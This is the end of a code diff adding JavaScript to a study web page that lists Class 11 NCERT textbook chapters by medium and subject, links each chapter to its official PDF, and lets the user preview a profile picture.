+                    { title: "अध्याय 3: तत्वों का वर्गीकरण एवं आवर्तिता", url: "https://ncert.nic.in/textbook/pdf/khch103.pdf" },
+                    { title: "अध्याय 4: रासायनिक आबंधन तथा आणविक संरचना", url: "https://ncert.nic.in/textbook/pdf/khch104.pdf" },
+                    { title: "अध्याय 5: ऊष्मागतिकी", url: "https://ncert.nic.in/textbook/pdf/khch105.pdf" },
+                    { title: "अध्याय 6: साम्यावस्था", url: "https://ncert.nic.in/textbook/pdf/khch106.pdf" },
+                    { title: "अध्याय 7: अपचयोपचय अभिक्रियाएँ", url: "https://ncert.nic.in/textbook/pdf/khch107.pdf" },
+                    { title: "अध्याय 8: कार्बनिक रसायन - कुछ आधारभूत सिद्धांत", url: "https://ncert.nic.in/textbook/pdf/khch108.pdf" },
+                    { title: "अध्याय 9: हाइड्रोकार्बन", url: "https://ncert.nic.in/textbook/pdf/khch109.pdf" },
+                    { title: "अध्याय 10: पर्यावरण रसायन", url: "https://ncert.nic.in/textbook/pdf/khch110.pdf" }
+                ],
+                "जीव विज्ञान (Biology)": [
+                    { title: "अध्याय 1: जीव जगत", url: "https://ncert.nic.in/textbook/pdf/khbo101.pdf" },
+                    { title: "अध्याय 2: जीव जगत का वर्गीकरण", url: "https://ncert.nic.in/textbook/pdf/khbo102.pdf" },
+                    { title: "अध्याय 3: वनस्पति जगत", url: "https://ncert.nic.in/textbook/pdf/khbo103.pdf" },
+                    { title: "अध्याय 4: प्राणी जगत", url: "https://ncert.nic.in/textbook/pdf/khbo104.pdf" },
+                    { title: "अध्याय 5: पुष्पी पादपों की आकारिकी", url: "https://ncert.nic.in/textbook/pdf/khbo105.pdf" },
+                    { title: "अध्याय 6: पुष्पी पादपों का शरीर", url: "https://ncert.nic.in/textbook/pdf/khbo106.pdf" },
+                    { title: "अध्याय 7: प्राणियों में संरचनात्मक संगठन", url: "https://ncert.nic.in/textbook/pdf/khbo107.pdf" },
+                    { title: "अध्याय 8: कोशिका: जीवन की इकाई", url: "https://ncert.nic.in/textbook/pdf/khbo108.pdf" },
+                    { title: "अध्याय 9: जैव अणु", url: "https://ncert.nic.in/textbook/pdf/khbo109.pdf" },
+                    { title: "अध्याय 10: कोशिका चक्र और विभाजन", url: "https://ncert.nic.in/textbook/pdf/khbo110.pdf" }
+                ],
+                "हिंदी (Hindi)": [
+                    { title: "पाठ 1: कबीर", url: "https://ncert.nic.in/textbook/pdf/khah101.pdf" },
+                    { title: "पाठ 2: मीरा", url: "https://ncert.nic.in/textbook/pdf/khah102.pdf" },
+                    { title: "पाठ 3: वे आँखें", url: "https://ncert.nic.in/textbook/pdf/khah103.pdf" },
+                    { title: "पाठ 4: घर की याद", url: "https://ncert.nic.in/textbook/pdf/khah104.pdf" },
+                    { title: "पाठ 5: गजल", url: "https://ncert.nic.in/textbook/pdf/khah105.pdf" }
+                ],
+                "अंग्रेजी (English)": [
+                    { title: "Chapter 1: The Portrait of a Lady", url: "https://ncert.nic.in/textbook/pdf/kehb101.pdf" }
+                ]
+            },
+            "English Medium": {
+                "Mathematics": [
+                    { title: "Chapter 1: Sets", url: "https://ncert.nic.in/textbook/pdf/kemh101.pdf" },
+                    { title: "Chapter 2: Relations and Functions", url: "https://ncert.nic.in/textbook/pdf/kemh102.pdf" },
+                    { title: "Chapter 3: Trigonometric Functions", url: "https://ncert.nic.in/textbook/pdf/kemh103.pdf" },
+                    { title: "Chapter 4: Complex Numbers", url: "https://ncert.nic.in/textbook/pdf/kemh104.pdf" },
+                    { title: "Chapter 5: Linear Inequalities", url: "https://ncert.nic.in/textbook/pdf/kemh105.pdf" },
+                    { title: "Chapter 6: Permutations and Combinations", url: "https://ncert.nic.in/textbook/pdf/kemh106.pdf" },
+                    { title: "Chapter 7: Binomial Theorem", url: "https://ncert.nic.in/textbook/pdf/kemh107.pdf" },
+                    { title: "Chapter 8: Sequences and Series", url: "https://ncert.nic.in/textbook/pdf/kemh108.pdf" },
+                    { title: "Chapter 9: Straight Lines", url: "https://ncert.nic.in/textbook/pdf/kemh109.pdf" },
+                    { title: "Chapter 10: Conic Sections", url: "https://ncert.nic.in/textbook/pdf/kemh110.pdf" },
+                    { title: "Chapter 11: 3D Geometry", url: "https://ncert.nic.in/textbook/pdf/kemh111.pdf" },
+                    { title: "Chapter 12: Limits and Derivatives", url: "https://ncert.nic.in/textbook/pdf/kemh112.pdf" },
+                    { title: "Chapter 13: Statistics", url: "https://ncert.nic.in/textbook/pdf/kemh113.pdf" },
+                    { title: "Chapter 14: Probability", url: "https://ncert.nic.in/textbook/pdf/kemh114.pdf" }
+                ],
+                "Physics": [
+                    { title: "Chapter 1: Physical World", url: "https://ncert.nic.in/textbook/pdf/keph101.pdf" },
+                    { title: "Chapter 2: Units and Measurement", url: "https://ncert.nic.in/textbook/pdf/keph102.pdf" },
+                    { title: "Chapter 3: Motion in a Straight Line", url: "https://ncert.nic.in/textbook/pdf/keph103.pdf" },
+                    { title: "Chapter 4: Motion in a Plane", url: "https://ncert.nic.in/textbook/pdf/keph104.pdf" },
+                    { title: "Chapter 5: Laws of Motion", url: "https://ncert.nic.in/textbook/pdf/keph105.pdf" },
+                    { title: "Chapter 6: Work, Energy and Power", url: "https://ncert.nic.in/textbook/pdf/keph106.pdf" },
+                    { title: "Chapter 7: System of Particles", url: "https://ncert.nic.in/textbook/pdf/keph107.pdf" },
+                    { title: "Chapter 8: Gravitation", url: "https://ncert.nic.in/textbook/pdf/keph108.pdf" },
+                    { title: "Chapter 9: Mechanical Properties of Solids", url: "https://ncert.nic.in/textbook/pdf/keph109.pdf" },
+                    { title: "Chapter 10: Mechanical Properties of Fluids", url: "https://ncert.nic.in/textbook/pdf/keph110.pdf" },
+                    { title: "Chapter 11: Thermal Properties of Matter", url: "https://ncert.nic.in/textbook/pdf/keph111.pdf" },
+                    { title: "Chapter 12: Thermodynamics", url: "https://ncert.nic.in/textbook/pdf/keph112.pdf" },
+                    { title: "Chapter 13: Kinetic Theory", url: "https://ncert.nic.in/textbook/pdf/keph113.pdf" },
+                    { title: "Chapter 14: Oscillations", url: "https://ncert.nic.in/textbook/pdf/keph114.pdf" },
+                    { title: "Chapter 15: Waves", url: "https://ncert.nic.in/textbook/pdf/keph115.pdf" }
+                ],
+                "Chemistry": [
+                    { title: "Chapter 1: Some Basic Concepts", url: "https://ncert.nic.in/textbook/pdf/kech101.pdf" },
+                    { title: "Chapter 2: Structure of Atom", url: "https://ncert.nic.in/textbook/pdf/kech102.pdf" },
+                    { title: "Chapter 3: Classification of Elements", url: "https://ncert.nic.in/textbook/pdf/kech103.pdf" },
+                    { title: "Chapter 4: Chemical Bonding", url: "https://ncert.nic.in/textbook/pdf/kech104.pdf" },
+                    { title: "Chapter 5: Thermodynamics", url: "https://ncert.nic.in/textbook/pdf/kech105.pdf" },
+                    { title: "Chapter 6: Equilibrium", url: "https://ncert.nic.in/textbook/pdf/kech106.pdf" },
+                    { title: "Chapter 7: Redox Reactions", url: "https://ncert.nic.in/textbook/pdf/kech107.pdf" },
+                    { title: "Chapter 8: Organic Chemistry", url: "https://ncert.nic.in/textbook/pdf/kech108.pdf" },
+                    { title: "Chapter 9: Hydrocarbons", url: "https://ncert.nic.in/textbook/pdf/kech109.pdf" },
+                    { title: "Chapter 10: Environmental Chemistry", url: "https://ncert.nic.in/textbook/pdf/kech110.pdf" }
+                ],
+                "Biology": [
+                    { title: "Chapter 1: The Living World", url: "https://ncert.nic.in/textbook/pdf/kebo101.pdf" },
+                    { title: "Chapter 2: Biological Classification", url: "https://ncert.nic.in/textbook/pdf/kebo102.pdf" },
+                    { title: "Chapter 3: Plant Kingdom", url: "https://ncert.nic.in/textbook/pdf/kebo103.pdf" },
+                    { title: "Chapter 4: Animal Kingdom", url: "https://ncert.nic.in/textbook/pdf/kebo104.pdf" },
+                    { title: "Chapter 5: Morphology of Flowering Plants", url: "https://ncert.nic.in/textbook/pdf/kebo105.pdf" },
+                    { title: "Chapter 6: Anatomy of Flowering Plants", url: "https://ncert.nic.in/textbook/pdf/kebo106.pdf" },
+                    { title: "Chapter 7: Structural Organisation in Animals", url: "https://ncert.nic.in/textbook/pdf/kebo107.pdf" },
+                    { title: "Chapter 8: Cell: The Unit of Life", url: "https://ncert.nic.in/textbook/pdf/kebo108.pdf" },
+                    { title: "Chapter 9: Biomolecules", url: "https://ncert.nic.in/textbook/pdf/kebo109.pdf" },
+                    { title: "Chapter 10: Cell Cycle and Division", url: "https://ncert.nic.in/textbook/pdf/kebo110.pdf" }
+                ],
+                "English": [
+                    { title: "Chapter 1: The Portrait of a Lady", url: "https://ncert.nic.in/textbook/pdf/kehb101.pdf" },
+                    { title: "Chapter 2: We're Not Afraid to Die...", url: "https://ncert.nic.in/textbook/pdf/kehb102.pdf" },
+                    { title: "Chapter 3: Discovering Tut", url: "https://ncert.nic.in/textbook/pdf/kehb103.pdf" }
+                ],
+                "Hindi": [
+                    { title: "Chapter 1: Kabir", url: "https://ncert.nic.in/textbook/pdf/khah101.pdf" },
+                    { title: "Chapter 2: Meera", url: "https://ncert.nic.in/textbook/pdf/khah102.pdf" }
+                ]
+            }
+        };
+
+        window.openMediumBooks = function(medium) {
+            activeMedium = medium;
+            showBooksView();
+            document.getElementById('app-header-main-title').innerText = medium;
+            document.getElementById('books-screen-title').innerText = medium + " Books";
+
+            let container = document.getElementById('books-grid-box');
+            container.innerHTML = "";
+
+            let booksList = (medium === 'Hindi Medium') ? hindiBooks : englishBooks;
+
+            booksList.forEach(book => {
+                let box = document.createElement('div');
+                box.className = 'book-item-box';
+                box.innerHTML = `<div style="font-size:32px; padding:10px 0;">${book.icon}</div><h4>${book.name}</h4>`;
+                box.onclick = () => loadChapters(book.name);
+                container.appendChild(box);
+            });
+        };
+
+        window.loadChapters = function(bookName) {
+            showChaptersView();
+            document.getElementById('app-header-main-title').innerText = bookName;
+            document.getElementById('chapters-screen-title').innerText = bookName + " - Chapters";
+
+            let container = document.getElementById('chapters-container-box');
+            container.innerHTML = "";
+
+            let chapters = (ncertChapters[activeMedium] && ncertChapters[activeMedium][bookName]) ? 
+                           ncertChapters[activeMedium][bookName] : 
+                           [{ title: "Chapter 1: Default Chapter", url: "https://ncert.nic.in/textbook/pdf/kemh101.pdf" }];
+
+            chapters.forEach((ch) => {
+                let row = document.createElement('div');
+                row.className = 'chapter-row-item';
+                row.innerHTML = `<span>${ch.title}</span><span>➔ Open PDF</span>`;
+                row.onclick = () => window.open(ch.url, '_blank');
+                container.appendChild(row);
+            });
+        };
+
+        window.loadProfilePic = function(event) {
+            var image = document.getElementById('user-avatar');
+            image.src = URL.createObjectURL(event.target.files[0]);
+        };
+    </script>
+
 </body>
 </html>
